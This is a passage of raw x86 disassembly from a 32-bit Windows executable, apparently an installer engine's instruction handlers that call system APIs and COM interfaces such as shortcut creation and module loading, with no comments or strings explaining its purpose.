  401dc9:	c1 f9 02             	sar    $0x2,%ecx
  401dcc:	85 c9                	test   %ecx,%ecx
  401dce:	74 1f                	je     0x401def
  401dd0:	8d 55 f4             	lea    -0xc(%ebp),%edx
  401dd3:	52                   	push   %edx
  401dd4:	51                   	push   %ecx
  401dd5:	6a 00                	push   $0x0
  401dd7:	ff 75 08             	push   0x8(%ebp)
  401dda:	ff 75 f8             	push   -0x8(%ebp)
  401ddd:	50                   	push   %eax
  401dde:	56                   	push   %esi
  401ddf:	ff 15 3c 82 40 00    	call   *0x40823c
  401de5:	f7 d8                	neg    %eax
  401de7:	1b c0                	sbb    %eax,%eax
  401de9:	40                   	inc    %eax
  401dea:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ded:	eb 45                	jmp    0x401e34
  401def:	ff 75 08             	push   0x8(%ebp)
  401df2:	ff 75 f8             	push   -0x8(%ebp)
  401df5:	50                   	push   %eax
  401df6:	56                   	push   %esi
  401df7:	ff 15 78 82 40 00    	call   *0x408278
  401dfd:	eb 32                	jmp    0x401e31
  401dff:	33 f6                	xor    %esi,%esi
  401e01:	46                   	inc    %esi
  401e02:	e8 55 f6 ff ff       	call   0x40145c
  401e07:	6a 12                	push   $0x12
  401e09:	5e                   	pop    %esi
  401e0a:	8b d8                	mov    %eax,%ebx
  401e0c:	e8 4b f6 ff ff       	call   0x40145c
  401e11:	0f b7 08             	movzwl (%eax),%ecx
  401e14:	f7 d9                	neg    %ecx
  401e16:	1b c9                	sbb    %ecx,%ecx
  401e18:	23 c8                	and    %eax,%ecx
  401e1a:	0f b7 03             	movzwl (%ebx),%eax
  401e1d:	f7 d8                	neg    %eax
  401e1f:	51                   	push   %ecx
  401e20:	1b c0                	sbb    %eax,%eax
  401e22:	23 c3                	and    %ebx,%eax
  401e24:	50                   	push   %eax
  401e25:	ff 75 08             	push   0x8(%ebp)
  401e28:	ff 75 f8             	push   -0x8(%ebp)
  401e2b:	ff 15 5c 82 40 00    	call   *0x40825c
  401e31:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401e34:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  401e38:	0f 8c 1a 0e 00 00    	jl     0x402c58
  401e3e:	ff 75 f4             	push   -0xc(%ebp)
  401e41:	e9 0c 0e 00 00       	jmp    0x402c52
  401e46:	33 c9                	xor    %ecx,%ecx
  401e48:	e8 f9 f5 ff ff       	call   0x401446
  401e4d:	50                   	push   %eax
  401e4e:	ff 15 94 82 40 00    	call   *0x408294
  401e54:	e9 6a f9 ff ff       	jmp    0x4017c3
  401e59:	6a 02                	push   $0x2
  401e5b:	59                   	pop    %ecx
  401e5c:	e8 e5 f5 ff ff       	call   0x401446
  401e61:	33 c9                	xor    %ecx,%ecx
  401e63:	50                   	push   %eax
  401e64:	41                   	inc    %ecx
  401e65:	e8 dc f5 ff ff       	call   0x401446
  401e6a:	50                   	push   %eax
  401e6b:	ff 15 60 82 40 00    	call   *0x408260
  401e71:	e9 db 0d 00 00       	jmp    0x402c51
  401e76:	a1 c8 05 47 00       	mov    0x4705c8,%eax
  401e7b:	03 c2                	add    %edx,%eax
  401e7d:	50                   	push   %eax
  401e7e:	6a eb                	push   $0xffffffeb
  401e80:	33 c9                	xor    %ecx,%ecx
  401e82:	e8 bf f5 ff ff       	call   0x401446
  401e87:	50                   	push   %eax
  401e88:	ff 15 64 82 40 00    	call   *0x408264
  401e8e:	e9 c5 0d 00 00       	jmp    0x402c58
  401e93:	52                   	push   %edx
  401e94:	ff 75 f8             	push   -0x8(%ebp)
  401e97:	ff 15 60 82 40 00    	call   *0x408260
  401e9d:	8b f8                	mov    %eax,%edi
  401e9f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401ea2:	50                   	push   %eax
  401ea3:	57                   	push   %edi
  401ea4:	ff 15 84 82 40 00    	call   *0x408284
  401eaa:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401ead:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401eb1:	6a 10                	push   $0x10
  401eb3:	50                   	push   %eax
  401eb4:	8b 45 c0             	mov    -0x40(%ebp),%eax
  401eb7:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  401ebb:	50                   	push   %eax
  401ebc:	33 db                	xor    %ebx,%ebx
  401ebe:	53                   	push   %ebx
  401ebf:	33 f6                	xor    %esi,%esi
  401ec1:	e8 96 f5 ff ff       	call   0x40145c
  401ec6:	50                   	push   %eax
  401ec7:	53                   	push   %ebx
  401ec8:	ff 15 68 82 40 00    	call   *0x408268
  401ece:	50                   	push   %eax
  401ecf:	53                   	push   %ebx
  401ed0:	68 72 01 00 00       	push   $0x172
  401ed5:	57                   	push   %edi
  401ed6:	ff 15 78 82 40 00    	call   *0x408278
  401edc:	3b c3                	cmp    %ebx,%eax
  401ede:	0f 84 74 0d 00 00    	je     0x402c58
  401ee4:	50                   	push   %eax
  401ee5:	ff 15 44 80 40 00    	call   *0x408044
  401eeb:	e9 68 0d 00 00       	jmp    0x402c58
  401ef0:	6a 48                	push   $0x48
  401ef2:	6a 5a                	push   $0x5a
  401ef4:	ff 75 f8             	push   -0x8(%ebp)
  401ef7:	ff 15 6c 82 40 00    	call   *0x40826c
  401efd:	50                   	push   %eax
  401efe:	ff 15 40 80 40 00    	call   *0x408040
  401f04:	50                   	push   %eax
  401f05:	6a 02                	push   $0x2
  401f07:	59                   	pop    %ecx
  401f08:	e8 39 f5 ff ff       	call   0x401446
  401f0d:	50                   	push   %eax
  401f0e:	ff 15 48 81 40 00    	call   *0x408148
  401f14:	6a 03                	push   $0x3
  401f16:	f7 d8                	neg    %eax
  401f18:	59                   	pop    %ecx
  401f19:	a3 d0 e0 41 00       	mov    %eax,0x41e0d0
  401f1e:	e8 23 f5 ff ff       	call   0x401446
  401f23:	ff 75 e0             	push   -0x20(%ebp)
  401f26:	a3 e0 e0 41 00       	mov    %eax,0x41e0e0
  401f2b:	8a 45 ec             	mov    -0x14(%ebp),%al
  401f2e:	8a c8                	mov    %al,%cl
  401f30:	80 e1 01             	and    $0x1,%cl
  401f33:	88 0d e4 e0 41 00    	mov    %cl,0x41e0e4
  401f39:	8a c8                	mov    %al,%cl
  401f3b:	80 e1 02             	and    $0x2,%cl
  401f3e:	24 04                	and    $0x4,%al
  401f40:	68 ec e0 41 00       	push   $0x41e0ec
  401f45:	88 0d e5 e0 41 00    	mov    %cl,0x41e0e5
  401f4b:	a2 e6 e0 41 00       	mov    %al,0x41e0e6
  401f50:	c6 05 e7 e0 41 00 01 	movb   $0x1,0x41e0e7
  401f57:	e8 42 41 00 00       	call   0x40609e
  401f5c:	68 d0 e0 41 00       	push   $0x41e0d0
  401f61:	ff 15 4c 80 40 00    	call   *0x40804c
  401f67:	e9 e5 0c 00 00       	jmp    0x402c51
  401f6c:	33 c9                	xor    %ecx,%ecx
  401f6e:	e8 d3 f4 ff ff       	call   0x401446
  401f73:	33 c9                	xor    %ecx,%ecx
  401f75:	41                   	inc    %ecx
  401f76:	8b f0                	mov    %eax,%esi
  401f78:	e8 c9 f4 ff ff       	call   0x401446
  401f7d:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  401f81:	50                   	push   %eax
  401f82:	56                   	push   %esi
  401f83:	75 0b                	jne    0x401f90
  401f85:	ff 15 34 82 40 00    	call   *0x408234
  401f8b:	e9 c8 0c 00 00       	jmp    0x402c58
  401f90:	ff 15 70 82 40 00    	call   *0x408270
  401f96:	e9 bd 0c 00 00       	jmp    0x402c58
  401f9b:	33 f6                	xor    %esi,%esi
  401f9d:	e8 ba f4 ff ff       	call   0x40145c
  401fa2:	6a 31                	push   $0x31
  401fa4:	5e                   	pop    %esi
  401fa5:	8b f8                	mov    %eax,%edi
  401fa7:	e8 b0 f4 ff ff       	call   0x40145c
  401fac:	6a 22                	push   $0x22
  401fae:	5e                   	pop    %esi
  401faf:	89 45 08             	mov    %eax,0x8(%ebp)
  401fb2:	e8 a5 f4 ff ff       	call   0x40145c
  401fb7:	6a 15                	push   $0x15
  401fb9:	5e                   	pop    %esi
  401fba:	8b d8                	mov    %eax,%ebx
  401fbc:	e8 9b f4 ff ff       	call   0x40145c
  401fc1:	6a ec                	push   $0xffffffec
  401fc3:	e8 6d f4 ff ff       	call   0x401435
  401fc8:	0f b7 03             	movzwl (%ebx),%eax
  401fcb:	ff 75 e8             	push   -0x18(%ebp)
  401fce:	f7 d8                	neg    %eax
  401fd0:	1b c0                	sbb    %eax,%eax
  401fd2:	23 c3                	and    %ebx,%eax
  401fd4:	68 b0 90 4c 00       	push   $0x4c90b0
  401fd9:	50                   	push   %eax
  401fda:	0f b7 07             	movzwl (%edi),%eax
  401fdd:	ff 75 08             	push   0x8(%ebp)
  401fe0:	f7 d8                	neg    %eax
  401fe2:	1b c0                	sbb    %eax,%eax
  401fe4:	23 c7                	and    %edi,%eax
  401fe6:	50                   	push   %eax
  401fe7:	ff 75 f8             	push   -0x8(%ebp)
  401fea:	ff 15 84 81 40 00    	call   *0x408184
  401ff0:	83 f8 21             	cmp    $0x21,%eax
  401ff3:	0f 8d 5f 0c 00 00    	jge    0x402c58
  401ff9:	e9 23 f7 ff ff       	jmp    0x401721
  401ffe:	33 f6                	xor    %esi,%esi
  402000:	e8 57 f4 ff ff       	call   0x40145c
  402005:	8b f0                	mov    %eax,%esi
  402007:	56                   	push   %esi
  402008:	6a eb                	push   $0xffffffeb
  40200a:	e8 38 2a 00 00       	call   0x404a47
  40200f:	56                   	push   %esi
  402010:	e8 ab 36 00 00       	call   0x4056c0
  402015:	89 45 08             	mov    %eax,0x8(%ebp)
  402018:	85 c0                	test   %eax,%eax
  40201a:	0f 84 01 f7 ff ff    	je     0x401721
  402020:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  402024:	74 4f                	je     0x402075
  402026:	8b 35 24 81 40 00    	mov    0x408124,%esi
  40202c:	6a 64                	push   $0x64
  40202e:	50                   	push   %eax
  40202f:	ff d6                	call   *%esi
  402031:	bf 02 01 00 00       	mov    $0x102,%edi
  402036:	eb 0e                	jmp    0x402046
  402038:	6a 0f                	push   $0xf
  40203a:	e8 8b 3b 00 00       	call   0x405bca
  40203f:	6a 64                	push   $0x64
  402041:	ff 75 08             	push   0x8(%ebp)
  402044:	ff d6                	call   *%esi
  402046:	3b c7                	cmp    %edi,%eax
  402048:	74 ee                	je     0x402038
  40204a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40204d:	50                   	push   %eax
  40204e:	ff 75 08             	push   0x8(%ebp)
  402051:	ff 15 28 81 40 00    	call   *0x408128
  402057:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40205b:	7c 0b                	jl     0x402068
  40205d:	ff 75 f4             	push   -0xc(%ebp)
  402060:	53                   	push   %ebx
  402061:	e8 6d 39 00 00       	call   0x4059d3
  402066:	eb 0d                	jmp    0x402075
  402068:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40206c:	74 07                	je     0x402075
  40206e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402075:	ff 75 08             	push   0x8(%ebp)
  402078:	e9 40 06 00 00       	jmp    0x4026bd
  40207d:	6a 02                	push   $0x2
  40207f:	5e                   	pop    %esi
  402080:	e8 d7 f3 ff ff       	call   0x40145c
  402085:	50                   	push   %eax
  402086:	e8 e1 3a 00 00       	call   0x405b6c
  40208b:	8b f0                	mov    %eax,%esi
  40208d:	85 f6                	test   %esi,%esi
  40208f:	74 11                	je     0x4020a2
  402091:	ff 76 14             	push   0x14(%esi)
  402094:	53                   	push   %ebx
  402095:	e8 39 39 00 00       	call   0x4059d3
  40209a:	ff 76 18             	push   0x18(%esi)
  40209d:	e9 b0 0b 00 00       	jmp    0x402c52
  4020a2:	33 c0                	xor    %eax,%eax
  4020a4:	66 89 07             	mov    %ax,(%edi)
  4020a7:	66 89 03             	mov    %ax,(%ebx)
  4020aa:	e9 72 f6 ff ff       	jmp    0x401721
  4020af:	6a ee                	push   $0xffffffee
  4020b1:	5e                   	pop    %esi
  4020b2:	e8 a5 f3 ff ff       	call   0x40145c
  4020b7:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4020ba:	51                   	push   %ecx
  4020bb:	50                   	push   %eax
  4020bc:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4020bf:	e8 76 51 00 00       	call   0x40723a
  4020c4:	8b f0                	mov    %eax,%esi
  4020c6:	33 c0                	xor    %eax,%eax
  4020c8:	66 89 07             	mov    %ax,(%edi)
  4020cb:	66 89 03             	mov    %ax,(%ebx)
  4020ce:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4020d5:	85 f6                	test   %esi,%esi
  4020d7:	0f 84 7b 0b 00 00    	je     0x402c58
  4020dd:	56                   	push   %esi
  4020de:	6a 40                	push   $0x40
  4020e0:	ff 15 20 81 40 00    	call   *0x408120
  4020e6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4020e9:	85 c0                	test   %eax,%eax
  4020eb:	0f 84 67 0b 00 00    	je     0x402c58
  4020f1:	50                   	push   %eax
  4020f2:	56                   	push   %esi
  4020f3:	6a 00                	push   $0x0
  4020f5:	ff 75 d4             	push   -0x2c(%ebp)
  4020f8:	e8 37 51 00 00       	call   0x407234
  4020fd:	85 c0                	test   %eax,%eax
  4020ff:	74 35                	je     0x402136
  402101:	8d 45 cc             	lea    -0x34(%ebp),%eax
  402104:	50                   	push   %eax
  402105:	8d 45 08             	lea    0x8(%ebp),%eax
  402108:	50                   	push   %eax
  402109:	68 c8 82 40 00       	push   $0x4082c8
  40210e:	ff 75 f4             	push   -0xc(%ebp)
  402111:	e8 18 51 00 00       	call   0x40722e
  402116:	85 c0                	test   %eax,%eax
  402118:	74 1c                	je     0x402136
  40211a:	8b 45 08             	mov    0x8(%ebp),%eax
  40211d:	ff 70 08             	push   0x8(%eax)
  402120:	57                   	push   %edi
  402121:	e8 ad 38 00 00       	call   0x4059d3
  402126:	8b 45 08             	mov    0x8(%ebp),%eax
  402129:	ff 70 0c             	push   0xc(%eax)
  40212c:	53                   	push   %ebx
  40212d:	e8 a1 38 00 00       	call   0x4059d3
  402132:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402136:	ff 75 f4             	push   -0xc(%ebp)
  402139:	ff 15 2c 81 40 00    	call   *0x40812c
  40213f:	e9 14 0b 00 00       	jmp    0x402c58
  402144:	83 3d 78 06 47 00 00 	cmpl   $0x0,0x470678
  40214b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402152:	0f 8c b9 00 00 00    	jl     0x402211
  402158:	6a f0                	push   $0xfffffff0
  40215a:	5e                   	pop    %esi
  40215b:	e8 fc f2 ff ff       	call   0x40145c
  402160:	33 f6                	xor    %esi,%esi
  402162:	46                   	inc    %esi
  402163:	8b f8                	mov    %eax,%edi
  402165:	e8 f2 f2 ff ff       	call   0x40145c
  40216a:	33 f6                	xor    %esi,%esi
  40216c:	89 45 08             	mov    %eax,0x8(%ebp)
  40216f:	39 75 ec             	cmp    %esi,-0x14(%ebp)
  402172:	74 0d                	je     0x402181
  402174:	57                   	push   %edi
  402175:	ff 15 30 81 40 00    	call   *0x408130
  40217b:	8b d8                	mov    %eax,%ebx
  40217d:	3b de                	cmp    %esi,%ebx
  40217f:	75 10                	jne    0x402191
  402181:	6a 08                	push   $0x8
  402183:	56                   	push   %esi
  402184:	57                   	push   %edi
  402185:	ff 15 34 81 40 00    	call   *0x408134
  40218b:	8b d8                	mov    %eax,%ebx
  40218d:	3b de                	cmp    %esi,%ebx
  40218f:	74 79                	je     0x40220a
  402191:	ff 75 08             	push   0x8(%ebp)
  402194:	53                   	push   %ebx
  402195:	e8 63 3a 00 00       	call   0x405bfd
  40219a:	8b f8                	mov    %eax,%edi
  40219c:	3b fe                	cmp    %esi,%edi
  40219e:	74 3d                	je     0x4021dd
  4021a0:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4021a3:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  4021a6:	74 17                	je     0x4021bf
  4021a8:	ff 75 e4             	push   -0x1c(%ebp)
  4021ab:	e8 85 f2 ff ff       	call   0x401435
  4021b0:	ff d7                	call   *%edi
  4021b2:	85 c0                	test   %eax,%eax
  4021b4:	74 31                	je     0x4021e7
  4021b6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4021bd:	eb 28                	jmp    0x4021e7
  4021bf:	68 00 a0 40 00       	push   $0x40a000
  4021c4:	68 a0 a0 40 00       	push   $0x40a0a0
  4021c9:	68 00 10 47 00       	push   $0x471000
  4021ce:	68 04 20 00 00       	push   $0x2004
  4021d3:	ff 75 f8             	push   -0x8(%ebp)
  4021d6:	ff d7                	call   *%edi
  4021d8:	83 c4 14             	add    $0x14,%esp
  4021db:	eb 0a                	jmp    0x4021e7
  4021dd:	ff 75 08             	push   0x8(%ebp)
  4021e0:	6a f7                	push   $0xfffffff7
  4021e2:	e8 60 28 00 00       	call   0x404a47
  4021e7:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  4021ea:	0f 85 68 0a 00 00    	jne    0x402c58
  4021f0:	53                   	push   %ebx
  4021f1:	e8 1e 16 00 00       	call   0x403814
  4021f6:	85 c0                	test   %eax,%eax
  4021f8:	0f 84 5a 0a 00 00    	je     0x402c58
  4021fe:	53                   	push   %ebx
  4021ff:	ff 15 38 81 40 00    	call   *0x408138
  402205:	e9 4e 0a 00 00       	jmp    0x402c58
  40220a:	6a f6                	push   $0xfffffff6
  40220c:	e9 9b f5 ff ff       	jmp    0x4017ac
  402211:	6a e7                	push   $0xffffffe7
  402213:	e9 94 f5 ff ff       	jmp    0x4017ac
  402218:	6a f0                	push   $0xfffffff0
  40221a:	5e                   	pop    %esi
  40221b:	e8 3c f2 ff ff       	call   0x40145c
  402220:	6a df                	push   $0xffffffdf
  402222:	5e                   	pop    %esi
  402223:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  402226:	e8 31 f2 ff ff       	call   0x40145c
  40222b:	6a 02                	push   $0x2
  40222d:	5e                   	pop    %esi
  40222e:	8b d8                	mov    %eax,%ebx
  402230:	e8 27 f2 ff ff       	call   0x40145c
  402235:	6a cd                	push   $0xffffffcd
  402237:	5e                   	pop    %esi
  402238:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40223b:	e8 1c f2 ff ff       	call   0x40145c
  402240:	6a 45                	push   $0x45
  402242:	5e                   	pop    %esi
  402243:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402246:	e8 11 f2 ff ff       	call   0x40145c
  40224b:	53                   	push   %ebx
  40224c:	89 45 cc             	mov    %eax,-0x34(%ebp)
  40224f:	e8 52 35 00 00       	call   0x4057a6
  402254:	85 c0                	test   %eax,%eax
  402256:	75 08                	jne    0x402260
  402258:	6a 21                	push   $0x21
  40225a:	5e                   	pop    %esi
  40225b:	e8 fc f1 ff ff       	call   0x40145c
  402260:	8d 45 08             	lea    0x8(%ebp),%eax
  402263:	50                   	push   %eax
  402264:	68 c0 89 40 00       	push   $0x4089c0
  402269:	6a 01                	push   $0x1
  40226b:	6a 00                	push   $0x0
  40226d:	68 e0 89 40 00       	push   $0x4089e0
  402272:	ff 15 b8 82 40 00    	call   *0x4082b8
  402278:	85 c0                	test   %eax,%eax
  40227a:	0f 8c bb 00 00 00    	jl     0x40233b
  402280:	8b 45 08             	mov    0x8(%ebp),%eax
  402283:	8b 08                	mov    (%eax),%ecx
  402285:	8d 55 f4             	lea    -0xc(%ebp),%edx
  402288:	52                   	push   %edx
  402289:	68 d0 89 40 00       	push   $0x4089d0
  40228e:	50                   	push   %eax
  40228f:	ff 11                	call   *(%ecx)
  402291:	8b f8                	mov    %eax,%edi
  402293:	85 ff                	test   %edi,%edi
  402295:	0f 8c 93 00 00 00    	jl     0x40232e
  40229b:	8b 45 08             	mov    0x8(%ebp),%eax
  40229e:	8b 08                	mov    (%eax),%ecx
  4022a0:	53                   	push   %ebx
  4022a1:	50                   	push   %eax
  4022a2:	ff 51 50             	call   *0x50(%ecx)
  4022a5:	8b f8                	mov    %eax,%edi
  4022a7:	8b 45 08             	mov    0x8(%ebp),%eax
  4022aa:	8b 08                	mov    (%eax),%ecx
  4022ac:	68 b0 90 4c 00       	push   $0x4c90b0
  4022b1:	50                   	push   %eax
  4022b2:	ff 51 24             	call   *0x24(%ecx)
  4022b5:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4022b8:	8b c1                	mov    %ecx,%eax
  4022ba:	c1 f8 08             	sar    $0x8,%eax
  4022bd:	be ff 00 00 00       	mov    $0xff,%esi
  4022c2:	23 c6                	and    %esi,%eax
  4022c4:	74 0d                	je     0x4022d3
  4022c6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4022c9:	8b 11                	mov    (%ecx),%edx
  4022cb:	50                   	push   %eax
  4022cc:	51                   	push   %ecx
  4022cd:	ff 52 3c             	call   *0x3c(%edx)
  4022d0:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4022d3:	8b 45 08             	mov    0x8(%ebp),%eax
  4022d6:	8b 10                	mov    (%eax),%edx
  4022d8:	c1 f9 10             	sar    $0x10,%ecx
  4022db:	51                   	push   %ecx
  4022dc:	50                   	push   %eax
  4022dd:	ff 52 34             	call   *0x34(%edx)
  4022e0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4022e3:	66 83 38 00          	cmpw   $0x0,(%eax)
  4022e7:	74 10                	je     0x4022f9
  4022e9:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  4022ec:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4022ef:	8b 11                	mov    (%ecx),%edx
  4022f1:	23 de                	and    %esi,%ebx
  4022f3:	53                   	push   %ebx
  4022f4:	50                   	push   %eax
  4022f5:	51                   	push   %ecx
  4022f6:	ff 52 44             	call   *0x44(%edx)
  4022f9:	8b 45 08             	mov    0x8(%ebp),%eax
  4022fc:	ff 75 f8             	push   -0x8(%ebp)
  4022ff:	8b 08                	mov    (%eax),%ecx
  402301:	50                   	push   %eax
  402302:	ff 51 2c             	call   *0x2c(%ecx)
  402305:	8b 45 08             	mov    0x8(%ebp),%eax
  402308:	ff 75 cc             	push   -0x34(%ebp)
  40230b:	8b 08                	mov    (%eax),%ecx
  40230d:	50                   	push   %eax
  40230e:	ff 51 1c             	call   *0x1c(%ecx)
  402311:	85 ff                	test   %edi,%edi
  402313:	7c 10                	jl     0x402325
  402315:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402318:	8b 08                	mov    (%eax),%ecx
  40231a:	6a 01                	push   $0x1
  40231c:	ff 75 c4             	push   -0x3c(%ebp)
  40231f:	50                   	push   %eax
  402320:	ff 51 18             	call   *0x18(%ecx)
  402323:	8b f8                	mov    %eax,%edi
  402325:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402328:	8b 08                	mov    (%eax),%ecx
  40232a:	50                   	push   %eax
  40232b:	ff 51 08             	call   *0x8(%ecx)
  40232e:	8b 45 08             	mov    0x8(%ebp),%eax
  402331:	8b 08                	mov    (%eax),%ecx
  402333:	50                   	push   %eax
  402334:	ff 51 08             	call   *0x8(%ecx)
  402337:	85 ff                	test   %edi,%edi
  402339:	7d 0e                	jge    0x402349
  40233b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402342:	6a f0                	push   $0xfffffff0
  402344:	e9 63 f4 ff ff       	jmp    0x4017ac
  402349:	6a f4                	push   $0xfffffff4
  40234b:	e9 5c f4 ff ff       	jmp    0x4017ac
  402350:	33 f6                	xor    %esi,%esi
  402352:	e8 05 f1 ff ff       	call   0x40145c
  402357:	6a 11                	push   $0x11
  402359:	5e                   	pop    %esi
  40235a:	8b f8                	mov    %eax,%edi
  40235c:	e8 fb f0 ff ff       	call   0x40145c
  402361:	6a 23                	push   $0x23
  402363:	5e                   	pop    %esi
  402364:	8b d8                	mov    %eax,%ebx
  402366:	e8 f1 f0 ff ff       	call   0x40145c
  40236b:	57                   	push   %edi
  40236c:	8b f0                	mov    %eax,%esi
  40236e:	e8 f9 37 00 00       	call   0x405b6c
  402373:	85 c0                	test   %eax,%eax
  402375:	75 0e                	jne    0x402385
  402377:	6a 00                	push   $0x0
  402379:	6a f9                	push   $0xfffffff9
  40237b:	e8 c7 26 00 00       	call   0x404a47
  402380:	e9 9c f3 ff ff       	jmp    0x401721
  402385:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402388:	57                   	push   %edi
  402389:	89 45 ac             	mov    %eax,-0x54(%ebp)
  40238c:	c7 45 b0 02 00 00 00 	movl   $0x2,-0x50(%ebp)
  402393:	e8 0a 37 00 00       	call   0x405aa2
  402398:	33 c9                	xor    %ecx,%ecx
  40239a:	53                   	push   %ebx
  40239b:	66 89 4c 47 02       	mov    %cx,0x2(%edi,%eax,2)
  4023a0:	e8 fd 36 00 00       	call   0x405aa2
  4023a5:	33 c9                	xor    %ecx,%ecx
  4023a7:	66 89 4c 43 02       	mov    %cx,0x2(%ebx,%eax,2)
  4023ac:	66 8b 45 e4          	mov    -0x1c(%ebp),%ax
  4023b0:	56                   	push   %esi
  4023b1:	51                   	push   %ecx
  4023b2:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  4023b5:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  4023b8:	89 75 c6             	mov    %esi,-0x3a(%ebp)
  4023bb:	66 89 45 bc          	mov    %ax,-0x44(%ebp)
  4023bf:	e8 83 26 00 00       	call   0x404a47
  4023c4:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4023c7:	50                   	push   %eax
  4023c8:	ff 15 88 81 40 00    	call   *0x408188
  4023ce:	85 c0                	test   %eax,%eax
  4023d0:	0f 84 82 08 00 00    	je     0x402c58
  4023d6:	eb 9f                	jmp    0x402377
  4023d8:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4023dd:	0f 85 02 f9 ff ff    	jne    0x401ce5
  4023e3:	ff 05 54 06 47 00    	incl   0x470654
  4023e9:	e9 6a 08 00 00       	jmp    0x402c58
  4023ee:	33 db                	xor    %ebx,%ebx
  4023f0:	33 ff                	xor    %edi,%edi
  4023f2:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4023f5:	3b c3                	cmp    %ebx,%eax
  4023f7:	74 0c                	je     0x402405
  4023f9:	33 f6                	xor    %esi,%esi
  4023fb:	e8 5c f0 ff ff       	call   0x40145c
  402400:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402403:	8b f8                	mov    %eax,%edi
  402405:	85 d2                	test   %edx,%edx
  402407:	74 0b                	je     0x402414
  402409:	6a 11                	push   $0x11
  40240b:	5e                   	pop    %esi
  40240c:	e8 4b f0 ff ff       	call   0x40145c
  402411:	89 45 08             	mov    %eax,0x8(%ebp)
  402414:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402417:	74 0a                	je     0x402423
  402419:	6a 22                	push   $0x22
  40241b:	5e                   	pop    %esi
  40241c:	e8 3b f0 ff ff       	call   0x40145c
  402421:	8b d8                	mov    %eax,%ebx
  402423:	6a cd                	push   $0xffffffcd
  402425:	5e                   	pop    %esi
  402426:	e8 31 f0 ff ff       	call   0x40145c
  40242b:	50                   	push   %eax
  40242c:	53                   	push   %ebx
  40242d:	ff 75 08             	push   0x8(%ebp)
  402430:	57                   	push   %edi
  402431:	ff 15 3c 81 40 00    	call   *0x40813c
  402437:	e9 dd f2 ff ff       	jmp    0x401719
  40243c:	a1 c0 82 40 00       	mov    0x4082c0,%eax
  402441:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402444:	a1 c4 82 40 00       	mov    0x4082c4,%eax
  402449:	33 f6                	xor    %esi,%esi
  40244b:	46                   	inc    %esi
  40244c:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40244f:	e8 08 f0 ff ff       	call   0x40145c
  402454:	6a 12                	push   $0x12
  402456:	5e                   	pop    %esi
  402457:	8b d8                	mov    %eax,%ebx
  402459:	e8 fe ef ff ff       	call   0x40145c
  40245e:	6a dd                	push   $0xffffffdd
  402460:	5e                   	pop    %esi
  402461:	89 45 08             	mov    %eax,0x8(%ebp)
  402464:	e8 f3 ef ff ff       	call   0x40145c
  402469:	50                   	push   %eax
  40246a:	68 03 20 00 00       	push   $0x2003
  40246f:	57                   	push   %edi
  402470:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402473:	50                   	push   %eax
  402474:	ff 75 08             	push   0x8(%ebp)
  402477:	53                   	push   %ebx
  402478:	ff 15 40 81 40 00    	call   *0x408140
  40247e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402481:	50                   	push   %eax
  402482:	57                   	push   %edi
  402483:	ff 15 18 81 40 00    	call   *0x408118
  402489:	e9 1c f4 ff ff       	jmp    0x4018aa
  40248e:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  402492:	75 2c                	jne    0x4024c0
  402494:	6a 02                	push   $0x2
  402496:	e8 b2 f0 ff ff       	call   0x40154d
  40249b:	8b f8                	mov    %eax,%edi
  40249d:	85 ff                	test   %edi,%edi
  40249f:	0f 84 7c f2 ff ff    	je     0x401721
  4024a5:	6a 33                	push   $0x33
  4024a7:	5e                   	pop    %esi
  4024a8:	e8 af ef ff ff       	call   0x40145c
  4024ad:	50                   	push   %eax
  4024ae:	57                   	push   %edi
  4024af:	ff 15 10 80 40 00    	call   *0x408010
  4024b5:	57                   	push   %edi
  4024b6:	8b f0                	mov    %eax,%esi
  4024b8:	ff 15 08 80 40 00    	call   *0x408008
  4024be:	eb 2b                	jmp    0x4024eb
  4024c0:	6a 22                	push   $0x22
  4024c2:	5e                   	pop    %esi
  4024c3:	e8 94 ef ff ff       	call   0x40145c
  4024c8:	8b 4d e0             	mov    -0x20(%ebp),%ecx
